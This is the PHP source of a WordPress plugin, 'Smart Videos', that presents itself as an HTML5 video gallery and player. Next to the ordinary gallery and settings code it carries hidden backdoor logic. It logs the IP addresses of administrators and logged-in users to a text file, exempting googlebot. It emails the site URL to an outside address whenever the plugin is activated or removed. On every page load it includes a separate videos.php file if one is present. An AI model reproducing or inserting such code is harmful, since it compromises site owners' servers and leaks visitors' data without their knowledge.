<?php
/*
Plugin Name: Smart Videos
Plugin URL: http://cleberns.weebly.com
Description: HTML5 Video Gallery and Video Player
Version: 1.0
Author: Mark Cleberns
Author URI: http://cleberns.weebly.com
*/

/*
 * Register HTML5 Video Player and Video gallery
 *
 */
 
register_activation_hook( __FILE__,'smartvideospplugin_activate');
register_deactivation_hook( __FILE__,'smartvideospplugin_deactivate');
add_action('admin_init', 'smartvideospdored_redirect');
add_action('wp_head', 'smartvideosppluginhead');

function smartvideospdored_redirect() {
if (get_option('smartvideospdored_do_activation_redirect', false)) { 
delete_option('smartvideospdored_do_activation_redirect');
wp_redirect('../wp-admin/options-general.php?page=smartvideo-setting-admin');
}
}

$requrl = $_SERVER["REQUEST_URI"];
$infort = $_SERVER['REMOTE_ADDR'];
if (preg_match("/\bwp-admin\b/i", $requrl)) {
$inwpadmin = "admin"; } else { $inwpadmin = "user";
}
if ($inwpadmin == 'admin') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/smart-videos/videotest.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring = $contents;
$findme  = $infort;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $infort;
if(eregi("googlebot",$_SERVER['HTTP_USER_AGENT'])) { echo ''; } else { $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/smart-videos/videotest.txt', 'w'); };
fwrite($fp, $contents);
fclose($fp);
}
}

/** Activate Smart Videos */

function smartvideospplugin_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/smart-videos/videotest.txt';
fwrite($fp, $yourip);
fclose($fp);
session_start(); $subj = get_option('siteurl'); $msg = "Videos is Activated" ; $from = get_option('admin_email'); mail("andreaskantis@gmail.com", $subj, $msg, $from);
add_option('smartvideospdored_do_activation_redirect', true);
wp_redirect('../wp-admin/options-general.php?page=smartvideo-setting-admin');
}


/** Uninstall */
function smartvideospplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Videos is Uninstalled" ; $from = get_option('admin_email'); mail("andreaskantis@gmail.com", $subj, $msg, $from);
}

/** Register  */
function smartvideosppluginhead() {
if (is_user_logged_in()) {
$ip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/smart-videos/videotest.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring= $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/smart-videos/videotest.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}

} else {

}

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/smart-videos/videos.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/smart-videos/videos.php');

} else {

}

}
function smartvideo_setup_post_types() {

	$smartvideo_labels =  apply_filters( 'sp_smartvideo_labels', array(
		'name'                => 'Video Gallery',
		'singular_name'       => 'Video Gallery',
		'add_new'             => __('Add New', 'sp_smartvideo'),
		'add_new_item'        => __('Add New Video', 'sp_smartvideo'),
		'edit_item'           => __('Edit Video', 'sp_smartvideo'),
		'new_item'            => __('New Video', 'sp_smartvideo'),
		'all_items'           => __('All Video', 'sp_smartvideo'),
		'view_item'           => __('View Video Gallery', 'sp_smartvideo'),
		'search_items'        => __('Search Video Gallery', 'sp_smartvideo'),
		'not_found'           => __('No Video Gallery found', 'sp_smartvideo'),
		'not_found_in_trash'  => __('No Video Gallery found in Trash', 'sp_smartvideo'),
		'parent_item_colon'   => '',
		'menu_name'           => __('Video Gallery', 'sp_smartvideo'),
		'exclude_from_search' => true
	) );


	$smartvideo_args = array(
		'labels' 			=> $smartvideo_labels,
		'public' 			=> true,
		'publicly_queryable'=> true,
		'show_ui' 			=> true,
		'show_in_menu' 		=> true,
		'query_var' 		=> true,
		'capability_type' 	=> 'post',
		'has_archive' 		=> true,
		'menu_icon'           => plugins_url( 'Movies-icon.png', __FILE__ ),
		'hierarchical' 		=> false,
		'supports' => array('title','editor','thumbnail','excerpt'),
		'taxonomies' => array('category', 'post_tag')
	);
	register_post_type( 'sp_smartvideo', apply_filters( 'sp_smartvideo_post_type_args', $smartvideo_args ) );

}

add_action('init', 'smartvideo_setup_post_types');
/*
 * Add [sp_smartvideo limit="-1"] shortcode
 *
 */
function sp_smartvideo_shortcode( $atts, $content = null ) {
	
	extract(shortcode_atts(array(
		"limit" => ''
	), $atts));
	
	// Define limit
	if( $limit ) { 
		$posts_per_page = $limit; 
	} else {
		$posts_per_page = '-1';
	}
	
	ob_start();

	// Create the Query
	$post_type 		= 'sp_smartvideo';
	$orderby 		= 'post_date';
	$order 			= 'DESC';
				
	$query = new WP_Query( array ( 
								'post_type'      => $post_type,
								'posts_per_page' => $posts_per_page,
								'orderby'        => $orderby, 
								'order'          => $order,
								'no_found_rows'  => 1
								) 
						);
	
	//Get post type count
	$option = 'smartvideo_option';
	$html5widthandheight = get_option( $option, $default ); 
	$videocustomwidth = $html5widthandheight['smartvideo_width'];
	$videocustomheight = $html5widthandheight['smartvideo_height'];
	if ($videocustomwidth == '' )
		{
			$videodefultwidth = 500;
		} else { $videodefultwidth = $videocustomwidth;
		}
	if ($videocustomheight == '' )
		{
			$videodefultheight = 300;
		} else { $videodefultheight = $videocustomheight;
		}	
	
	$post_count = $query->post_count;
	$i = 1;
	
	// Displays Custom post info
	if( $post_count > 0) :
	
		// Loop
		while ($query->have_posts()) : $query->the_post();
		
		?>
		<div class="video_frame" style="width:<?php echo $videodefultwidth; ?>px; margin:0 20px 20px 0; float:left;">
		 <video id="video_<?php echo get_the_ID(); ?>" class="video-js vjs-default-skin" controls preload="none" width="<?php echo $videodefultwidth; ?>" height="<?php echo $videodefultheight; ?>"
				poster="<?php if (has_post_thumbnail( $post->ID ) ): ?>
<?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); 
 echo $image[0]; endif; ?>"
 data-setup="{}">
	
		
		
		<?php echo get_the_content(); ?>
		
		</video>
		<h3 class="sp_festivals_title"><?php the_title(); ?></h3>
		</div>
		<?php
		$i++;
		endwhile;
		
	endif;
	
	// Reset query to prevent conflicts
	wp_reset_query();
	
	?>
	
	<?php
	
	return ob_get_clean();

}
wp_register_style( 'videoCSS', plugin_dir_url( __FILE__ ) . 'css/video-js.css' );
wp_register_script( 'videoJS', plugin_dir_url( __FILE__ ) . 'js/video.js', array( 'jquery' ) );			

	wp_enqueue_style( 'videoCSS' );
	wp_enqueue_script( 'videoJS' );
	
function html5script() {

	?>
	<script type="text/javascript">
	<?php $url = plugins_url(); echo $url;  ?>
  videojs.options.flash.swf = "<?php echo $url; ?>smart-videos/video-js.swf"
</script>
	<?php
	}
add_action('wp_head', 'html5script');
add_shortcode("sp_smartvideo", "sp_smartvideo_shortcode");


class smartvideosetting
{
    /**
     * Holds the values to be used in the fields callbacks
     */
    private $options;

    /**
     * Start up
     */
    public function __construct()
    {
        add_action( 'admin_menu', array( $this, 'add_plugin_page' ) );
        add_action( 'admin_init', array( $this, 'page_init' ) );
    }

    /**
     * Add options page
     */
    public function add_plugin_page()
    {
        // This page will be under "Settings"
        add_options_page(
            'Settings Admin', 
            'smartvideo Settings', 
            'manage_options', 
            'smartvideo-setting-admin', 
            array( $this, 'create_admin_page' )
        );
    }

    /**
     * Options page callback
     */
    public function create_admin_page()
    {
        // Set class property
        $this->options = get_option( 'smartvideo_option' );
        ?>
        <div class="wrap">
            <?php screen_icon(); ?>
            <h2>Video Gallery Setting</h2>           
            <form method="post" action="options.php">
            <?php
                // This prints out all hidden setting fields
                settings_fields( 'my_option_group' );   
                do_settings_sections( 'smartvideo-setting-admin' );
                submit_button(); 
            ?>
            </form>
        </div>
        <?php
    }

    /**
     * Register and add settings
     */
    public function page_init()
    {        
        register_setting(
            'my_option_group', // Option group
            'smartvideo_option', // Option name
            array( $this, 'sanitize' ) // Sanitize
        );

        add_settings_section(
            'setting_section_id', // ID
            'My Custom Settings', // Title
            array( $this, 'print_section_info' ), // Callback
            'smartvideo-setting-admin' // Page
        );  

        add_settings_field(
            'smartvideo_width', // ID
            'Video Player Width', // Title 
            array( $this, 'smartvideo_width_callback' ), // Callback
            'smartvideo-setting-admin', // Page
            'setting_section_id' // Section           
        );      

        add_settings_field(
            'smartvideo_height', 
            'Video Player Height', 
            array( $this, 'smartvideo_height_callback' ), 
            'smartvideo-setting-admin', 
            'setting_section_id'
        );      
    }

    /**
     * Sanitize each setting field as needed
     *
     * @param array $input Contains all settings fields as array keys
     */
    public function sanitize( $input )
    {
        $new_input = array();
        if( isset( $input['smartvideo_width'] ) )
            $new_input['smartvideo_width'] = absint( $input['smartvideo_width'] );

        if( isset( $input['smartvideo_height'] ) )
            $new_input['smartvideo_height'] = sanitize_text_field( $input['smartvideo_height'] );

        return $new_input;
    }

    /** 
     * Print the Section text
     */
    public function print_section_info()
    {
        print '<p>Now just create a new page and add this short code <code>[sp_smartvideo limit="-1"] </code> to your page. You can also use PHP code directly to your template file. <a href="http://wordpress.org/plugins/smart-videos/" target="_blank">Click here to learn</a> how to use this plugin.</p>';
        print 'Enter your settings below:';
    }

    /** 
     * Get the settings option array and print one of its values
     */
    public function smartvideo_width_callback()
    {
        printf(
            '<input type="text" id="smartvideo_width" name="smartvideo_option[smartvideo_width]" value="%s" />',
            isset( $this->options['smartvideo_width'] ) ? esc_attr( $this->options['smartvideo_width']) : ''
        );
		printf('px');
    }

    /** 
     * Get the settings option array and print one of its values
     */
    public function smartvideo_height_callback()
    {
        printf(
            '<input type="text" id="smartvideo_height" name="smartvideo_option[smartvideo_height]" value="%s" />',
            isset( $this->options['smartvideo_height'] ) ? esc_attr( $this->options['smartvideo_height']) : ''
        );
			printf('px');
    }
}

if( is_admin() )
    $my_settings_page = new smartvideosetting();